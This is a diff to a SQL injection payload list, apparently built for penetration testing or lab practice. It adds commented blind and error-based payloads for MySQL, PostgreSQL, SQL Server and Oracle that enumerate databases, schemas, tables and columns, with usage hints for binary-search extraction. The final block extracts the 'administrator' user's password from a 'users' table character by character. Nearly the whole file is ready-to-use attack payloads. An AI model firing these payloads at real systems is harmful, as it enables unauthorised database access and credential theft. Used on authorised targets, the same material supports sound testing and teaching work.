@@ -1,53 +1,108 @@
 # MySQL
+# MySQL: boolean test; checks current DB name length equals 8. Adjust 8 as needed. Inject into string context; keep space after --.
 ' AND LENGTH(database())=8-- 
+# MySQL: character extraction; first char of user() ASCII > 77 ('M'). Adjust index and threshold for binary search.
 ' AND ASCII(SUBSTRING((SELECT user()),1,1))>77-- 
-
 # PostgreSQL
+# PostgreSQL: boolean test; checks current_user length equals 13. Adjust number to probe.
 ' AND LENGTH((SELECT current_user))=13-- 
+# PostgreSQL: character extraction from current_database(); ASCII at position 1 > 77. Tweak index/bound.
 ' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>77-- 
-
 # SQL Server
+# SQL Server: boolean via CASE; first char of first DB name ASCII > 77 yields true.
 ' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>77) THEN 1 ELSE 0 END)=1-- 
-
 # Oracle
+# Oracle: string concatenation context; returns 'a' when USER first char ASCII > 77, else ''.
 || (SELECT CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN 'a' ELSE '' END FROM dual) ||
-
+# Oracle: error/no-error toggles for discovery and DBMS fingerprint
+'|| (SELECT '' FROM dual) ||'
+'|| (SELECT '' FROM not_a_real_table) ||'
+'|| (SELECT '' FROM dual WHERE 1=2) ||'
+'|| (SELECT '' FROM dual WHERE 1=1) ||'
+|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||
+|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||
 # MySQL (enum)
+# MySQL: DB name length > 5.
 ' AND LENGTH(DATABASE())>5-- 
+# MySQL: first char of VERSION() ASCII > 77.
 ' AND ASCII(SUBSTRING((SELECT VERSION()),1,1))>77-- 
+# MySQL: at least one schema exists.
 ' AND (SELECT COUNT(*) FROM information_schema.schemata)>0-- 
+# MySQL: extract first char of first schema name (ordered). Iterate OFFSET to enumerate.
 ' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET 0),1,1))>77-- 
+# MySQL: any tables exist in current database.
 ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0-- 
+# MySQL: extract first char of first table name in current DB.
 ' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>77-- 
+# MySQL: extract first char of first column name for first table in current DB.
 ' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET 0) ORDER BY ordinal_position LIMIT 1),1,1))>77-- 
+# MySQL: existence check for table 'users' in current DB.
 ' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=database() AND table_name='users')-- 
-
 # PostgreSQL (enum)
+# PostgreSQL: DB name length > 5.
 ' AND LENGTH(current_database())>5-- 
+# PostgreSQL: first char of version() ASCII > 77.
 ' AND ASCII(SUBSTRING((SELECT version()),1,1))>77-- 
+# PostgreSQL: at least one schema exists.
 ' AND (SELECT COUNT(*) FROM information_schema.schemata)>0-- 
+# PostgreSQL: extract first char of first schema name (ordered). Use OFFSET to iterate.
 ' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET 0),1,1))>77-- 
+# PostgreSQL: any tables exist in current schema.
 ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_schema())>0-- 
+# PostgreSQL: extract first char of first table name in current schema.
 ' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>77-- 
+# PostgreSQL: extract first char of first column name for first table.
 ' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() ORDER BY table_name LIMIT 1 OFFSET 0) ORDER BY ordinal_position LIMIT 1),1,1))>77-- 
+# PostgreSQL: existence check for table 'users' in current schema.
 ' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=current_schema() AND table_name='users')-- 
-
 # SQL Server (enum)
+# SQL Server: DB_NAME() length > 5.
 ' AND (SELECT CASE WHEN LEN(DB_NAME())>5 THEN 1 ELSE 0 END)=1-- 
+# SQL Server: first char of @@version ASCII > 77.
 ' AND (SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>77 THEN 1 ELSE 0 END)=1-- 
+# SQL Server: at least one schema exists.
 ' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA)>0 THEN 1 ELSE 0 END)=1-- 
+# SQL Server: extract first char of first schema name (alphabetical).
 ' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT TOP 1 SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME),1,1))>77 THEN 1 ELSE 0 END)=1-- 
+# SQL Server: any tables exist in 'dbo' schema.
 ' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo')>0 THEN 1 ELSE 0 END)=1-- 
+# SQL Server: extract first char of first table name in 'dbo'.
 ' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' ORDER BY TABLE_NAME),1,1))>77 THEN 1 ELSE 0 END)=1-- 
+# SQL Server: extract first char of first column name from first 'dbo' table.
 ' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME=(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' ORDER BY TABLE_NAME) ORDER BY ORDINAL_POSITION),1,1))>77 THEN 1 ELSE 0 END)=1-- 
+# SQL Server: existence check for table 'users' in 'dbo'.
 ' AND EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME='users')-- 
-
 # Oracle (enum)
+# Oracle: DB name length > 5.
 ' AND (SELECT CASE WHEN LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))>5 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle: first char of version banner ASCII > 77.
 ' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>77 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle: at least one user exists.
 ' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle: extract first char of first username (alphabetical).
 ' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT username FROM (SELECT username FROM all_users ORDER BY username) WHERE ROWNUM=1),1,1))>77 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle: any user tables exist.
 ' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM user_tables)>0 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle: extract first char of first table name.
 ' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT table_name FROM (SELECT table_name FROM user_tables ORDER BY table_name) WHERE ROWNUM=1),1,1))>77 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle: extract first char of first column name from first table.
 ' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT column_name FROM (SELECT column_name FROM user_tab_columns WHERE table_name=(SELECT table_name FROM (SELECT table_name FROM user_tables ORDER BY table_name) WHERE ROWNUM=1) ORDER BY column_id) WHERE ROWNUM=1),1,1))>77 THEN 1 ELSE 0 END FROM dual)=1-- 
-|| (SELECT CASE WHEN (LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))>5) THEN 'a' ELSE '' END FROM dual) ||
+# Oracle: boolean string-concat variant; returns 'a' when true.
+'|| (SELECT CASE WHEN (LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))>5) THEN 'a' ELSE '' END FROM dual) ||
+# Oracle: error-based boolean; raises error when password length > 1 for 'administrator'. Use error/no error as signal.
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+# Oracle (boolean-blind password probes)
+# Oracle (non-concat): password length > threshold for a specific user.
+' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))>10 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle (non-concat): ASCII-based char extraction at a given position.
+' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))>77 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle (non-concat): equality-based char probe at a given position.
+' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a' THEN 1 ELSE 0 END FROM dual)=1-- 
+# Oracle (concat, unconcatenated leading quote not required): signal via concatenation when length condition true.
+|| (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))>10 THEN 'a' ELSE '' END FROM dual) ||
+# Oracle (concat, unconcatenated): ASCII-based char extraction signaled via concat.
+|| (SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))>77 THEN 'a' ELSE '' END FROM dual) ||
+# Oracle (concat with surrounding quotes for string context):
+'||(SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))>10 THEN 'a' ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))>77 THEN 'a' ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a' THEN 'a' ELSE '' END FROM dual)||'
